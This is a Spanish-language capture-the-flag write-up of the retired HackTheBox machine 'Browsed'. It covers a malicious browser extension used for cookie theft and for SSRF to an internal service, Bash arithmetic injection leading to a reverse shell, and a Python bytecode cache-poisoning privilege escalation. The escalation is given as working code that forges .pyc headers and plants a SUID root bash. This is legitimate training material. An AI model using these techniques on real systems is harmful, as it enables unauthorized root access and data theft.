---
title: "htb // browsed"
date: 2026-06-26
description: "writeup ténico sobre la máquina ya retirada llamada Browsed"
tags: ["medium", "linux", "htb", "writeup", "SSRF"]
draft: false
---
# HackTheBox: Browsed

**Dificultad:** Medium · **SO:** Linux · **Temas:** Extensiones de navegador, SSRF, Bash arithmetic injection, Python cache poisoning

## Resumen del recorrido

Browsed es una máquina Linux de dificultad media cuyo hilo conductor son los **peligros de las extensiones de navegador inseguras**. El camino completo:

- Se descubre un servicio web que permite **subir extensiones de Chrome en un ZIP**; el servidor las carga ciegamente en un navegador real y ejecuta acciones con ellas.
- Eso revela un subdominio interno con una instancia de **Gitea**, donde está el código fuente de un servicio interno (MarkdownPreview, una app Flask que convierte Markdown a HTML y corre en local en el puerto 5000).
- Se crea una **extensión maliciosa** para alcanzar ese servicio interno (un **SSRF** desde el navegador del servidor).
- Analizando el código se encuentra una **inyección aritmética de Bash** en un script (`routines.sh`) que recibe un parámetro sin sanear → **RCE** y shell como `larry`.
- Para escalar a root se abusa de un script ejecutable por sudo cuyo directorio `__pycache__` es **escribible por todos** → **Python cache poisoning**: se inyecta bytecode malicioso que crea un `bash` SUID root.

---

## Escaneo Nmap

```bash
nmap -A <IP_OBJETIVO> -T5
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

Solo dos puertos abiertos: SSH (22) y un servidor web nginx (80). Se añade el dominio al fichero de hosts:

```bash
echo "<IP_OBJETIVO> browsed.htb" | sudo tee -a /etc/hosts
```

---

## Enumeración web

El sitio promociona la empresa "Browsed", centrada en extensiones de Chrome. Leyendo la página principal queda claro que la compañía no se toma muy en serio la seguridad (pista temática).

Puntos interesantes encontrados navegando y enumerando:

- **`/samples.html`**: una página con varios ejemplos de extensiones de navegador que se pueden descargar. Útil más adelante como base.
- **`/upload.php`**: una funcionalidad donde cualquiera puede enviar su propia extensión en un **archivo ZIP** para que la "revise" el desarrollador de Browsed. Solo se aceptan ZIPs, y hay una ventana de salida que muestra el resultado del procesamiento.

Una funcionalidad de subida de archivos como esta abre la puerta a varias vulnerabilidades.

---

## Descubrir y enumerar la instancia de Gitea

Cómo probar la subida: descargar uno de los ejemplos (por ejemplo, **Fontify**) y subirlo tal cual a `/upload.php`. Para inspeccionar/modificar las peticiones se puede usar Burp Suite o Caido.

Tras unos 10 segundos, el servidor responde con un mensaje extraño que parece un **comando ejecutado en el sistema host**. Leyéndolo con atención se observa que la aplicación:

1. Carga nuestra "extensión" en un navegador **Google Chrome**.
2. Visita 2 URLs.
3. Captura los logs.

Y en ese comando aparece una URI nueva: **`browsedinternals.htb`**. Esto confirma que la web **confía ciegamente** en el ZIP que subimos y ejecuta acciones con él como si fuera una extensión legítima.

Se añade el subdominio al fichero de hosts:

```bash
echo "<IP_OBJETIVO> browsedinternals.htb" | sudo tee -a /etc/hosts
```

Y al visitarlo aparece una instancia interna de **Gitea** (un servicio Git autoalojado, ligero, similar en propósito a GitHub o GitLab).

Dentro hay **1 repositorio del usuario `larry`**, con el código fuente de una app web Python/Flask que convierte ficheros Markdown a HTML (**MarkdownPreview**). Revisando los ficheros uno a uno, solo dos son interesantes (el resto están prácticamente vacíos):

- **`app.py`**: el código principal de MarkdownPreview. Importante: corre **localmente/internamente en el puerto 5000**.
- **`routines.sh`**: una utilidad de mantenimiento multipropósito (backups, limpieza de ficheros) ligada a la app MarkdownPreview.

---

## Crear una extensión de navegador maliciosa

Las extensiones de navegador pueden presentar múltiples categorías de vulnerabilidades: inyección de código, XSS, fuga de datos y más. El objetivo aquí es construir una extensión maliciosa que permita acceder e interactuar con el sistema host. Quedan dos vías por evaluar.

### Robo de cookies

La primera idea es robar las cookies del navegador en el que se carga la extensión. La extensión, al cargarse, recoge todas las cookies del almacenamiento del navegador (el flag `httponly` no importa aquí, porque desde dentro de la extensión se acceden igual) y las envía a un servidor Python controlado por el atacante.

Cómo hacerlo: empaquetar los ficheros de la extensión en un ZIP y subirlo. Las cookies llegan rápidamente al servidor. Sin embargo, tras decodificar la URL (por ejemplo en CyberChef), el resultado es decepcionante: un **token que no se puede reutilizar** (cambia tras cada recarga) y un almacenamiento vacío. Sin botín.

### SSRF hacia el servicio interno

Tras ese fallo, conviene volver al repositorio de Gitea y mirar la app más de cerca. Según el endpoint, la app permite enviar ficheros, listarlos y verlos tras la conversión. **El servicio corre en local (puerto 5000).**

La idea: ¿y si la extensión, ejecutándose dentro del navegador del propio servidor, alcanza ese servicio local y abusa de su funcionalidad para ver ficheros sensibles? Eso es un **SSRF**.

Cómo hacerlo: construir una extensión que haga peticiones al `localhost:5000` del host y reenvíe la respuesta a nuestro servidor. Tras subirla, el servidor Python recibe los datos; al decodificarlos aparece la salida familiar del código que vimos antes → **se confirma que podemos alcanzar el servicio interno**.

> Para avanzar desde aquí hay que encadenar la extensión con el servicio MarkdownPreview a través de la vulnerabilidad presente en el script de mantenimiento, que se analiza a continuación.

---

## Inyección aritmética de Bash → acceso inicial y flag de usuario

Para encontrar la vía de ataque hay que mirar el código expuesto con más cuidado. Como las vulnerabilidades suelen estar ligadas a la entrada del usuario, conviene **trazar cómo fluye la entrada** a través del programa.

El punto clave es la función `routines` de `app.py`, que invoca el script `routines.sh` y le pasa un parámetro **`rid` sin sanear**. El comentario "no shell" en el código resulta sospechoso.

Dentro de `routines.sh`, la entrada del usuario se compara con un par de enteros mediante una **expansión aritmética**. A primera vista parece código seguro, pero es vulnerable a **Bash arithmetic injection**, que puede llevar a RCE.

Por qué funciona: una expresión del tipo `$((...))` **evalúa** su contenido, y dentro se puede colar `$(comando)`, que Bash reconoce como un comando y lo ejecuta (algo parecido a la función `eval`). Por eso es tan importante sanear la entrada del usuario.

Cómo explotarlo: se modifica la extensión para que la petición al servicio interno incluya el payload en el parámetro `rid`. Conviene probar primero con un comando que no devuelva nada visible (como `id`) para verificar que la cadena se ejecuta sin errores. Si el servidor responde con el mensaje "Routine executed !", el código se ejecutó correctamente.

Sabiendo que el payload funciona, se levanta un listener y se reemplaza el comando por uno que abra una reverse shell. **Importante: hay que usar `busybox`**, porque Netcat por sí solo no funcionaba en este caso.

```bash
nc -lnvp 1234
```

```
listening on [any] 1234 ...
connect to [<IP_VPN>] from (UNKNOWN) [<IP_OBJETIVO>] 54842
id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```

Shell como **`larry`**. La shell cae dentro del directorio de MarkdownPreview. La flag de usuario está en el home de Larry. Para tener acceso estable y persistente, se copia también la **clave SSH privada** de Larry y se usa para entrar:

```bash
ssh larry@browsed.htb -i id_ed25519
```

---

## Python cache poisoning → flag de root

Fase de escalada de privilegios. Siguiendo la checklist habitual, se revisan los permisos de sudo:

```bash
sudo -l
```

```
User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

Se puede ejecutar como root, sin contraseña, el script `/opt/extensiontool/extension_tool.py`.

Antes de ejecutarlo, conviene mirar el código. Es largo pero no complejo: es una herramienta de línea de comandos para gestionar extensiones (subir versión, empaquetar en ZIP, validar el manifest, limpiar temporales). Lo relevante es que **importa funciones de otro módulo**, `extension_utils`:

```python
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'
# ... (bump_version, package_extension, main) ...
```

El módulo importado `extension_utils.py` valida el manifest y limpia ficheros temporales:

```python
import os
import json
import subprocess
import shutil
from jsonschema import validate, ValidationError

MANIFEST_SCHEMA = { ... }

def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    try:
        validate(instance=data, schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:")
        print(e.message)
        exit(1)

def clean_temp_files(extension_dir):
    temp_dir = '/opt/extensiontool/temp'
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        ...
    exit(0)
```

La vulnerabilidad **no está en el script en sí**, sino justo al lado. Inspeccionando el directorio:

```bash
ls -la /opt/extensiontool
```

```
drwxrwxr-x 5 root root 4096 ... extensions
-rwxrwxr-x 1 root root 2739 ... extension_tool.py
-rw-rw-r-- 1 root root 1245 ... extension_utils.py
drwxrwxrwx 2 root root 4096 ... __pycache__
```

El directorio **`__pycache__` es escribible por todos** (`drwxrwxrwx`), lo cual es muy inusual. Ese directorio es donde Python guarda automáticamente el **bytecode compilado** (`.pyc`) de los módulos para acelerar futuras ejecuciones.

La idea del **Python cache poisoning**: si se reemplaza el `.pyc` cacheado de `extension_utils` por uno malicioso (con los metadatos correctos para que pase la verificación de integridad), cuando root ejecute `extension_tool.py` —que importa `extension_utils`— Python cargará **nuestro bytecode** en lugar del original.

El plan de explotación es el siguiente.

**1. Crear el script malicioso.** Copia el binario `bash` y le pone el bit SUID. Se elige cualquier directorio escribible, por ejemplo `/tmp`:

```python
# /tmp/exploit.py
import os

os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
```

**2. Compilarlo** con `py_compile` para generar el `.pyc` en `__pycache__`:

```bash
python3 -m py_compile /tmp/exploit.py
ls -la __pycache__/
# exploit.cpython-312.pyc
```

**3. Falsificar los metadatos.** Si se colocara el `.pyc` sin más, fallaría la verificación de integridad (Python compara la fecha de modificación y el tamaño del `.py` original). Por eso se usa un segundo script que toma los metadatos del fichero fuente legítimo y forja una cabecera válida sobre nuestro bytecode:

```python
# poison.py
path_to_real_py = "/opt/extensiontool/extension_utils.py"
path_to_my_pyc  = "./__pycache__/exploit.cpython-312.pyc"
target_pyc      = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

import os
import struct

# 1. Metadatos del fichero fuente real
stat = os.stat(path_to_real_py)
mtime = int(stat.st_mtime)
size = stat.st_size & 0xFFFFFFFF

# 2. Leer nuestro bytecode malicioso
with open(path_to_my_pyc, "rb") as f:
    my_data = f.read()

# 3. Construir la cabecera válida (16 bytes en Python 3.12)
# Magic (4) | Flags (4) | Timestamp (4) | Size (4)
magic = my_data[:4]
flags = b'\x00\x00\x00\x00'
header = magic + flags + struct.pack("<I", mtime) + struct.pack("<I", size)

# 4. Combinar la cabecera nueva con el código (saltando la cabecera vieja)
final_pyc = header + my_data[16:]

# 5. Escribir en el destino
with open(target_pyc, "wb") as f:
    f.write(final_pyc)

print("[+] Malicious PYC poisoned with correct metadata!")
```

**4. Ejecutar el envenenamiento**, que crea el `.pyc` envenenado en el `__pycache__` del objetivo:

```bash
python3 poison.py
# [+] Malicious PYC poisoned with correct metadata!
```

**5. Disparar el exploit** ejecutando el script vía sudo. Al importar `extension_utils`, Python carga el bytecode envenenado y se crea la copia SUID de bash en `/tmp`:

```bash
sudo /opt/extensiontool/extension_tool.py
```

Finalmente, se lanza la shell de root con el bash SUID:

```bash
/tmp/bash -p
```

Y se obtiene la flag en `/root`.

---

## Resumen y notas finales

El tema central de Browsed son las extensiones de navegador: se crea una extensión maliciosa que alcanza un servicio interno vulnerable (vía SSRF), se consigue una reverse shell mediante **Bash arithmetic injection** y, tras enumerar, se escala a root **envenenando la caché de bytecode de Python** sobre un script ejecutable por sudo.

Lecciones que deja la máquina:

- Una funcionalidad que carga y ejecuta artefactos subidos por el usuario (aquí, "extensiones") confiando ciegamente en ellos es un vector de RCE clásico.
- La expansión aritmética de Bash (`$(( ... ))`) evalúa su contenido: nunca se debe meter entrada de usuario sin sanear ahí.
- Un directorio `__pycache__` escribible por todos junto a un script privilegiado permite secuestrar el bytecode que cargará el proceso de mayor privilegio.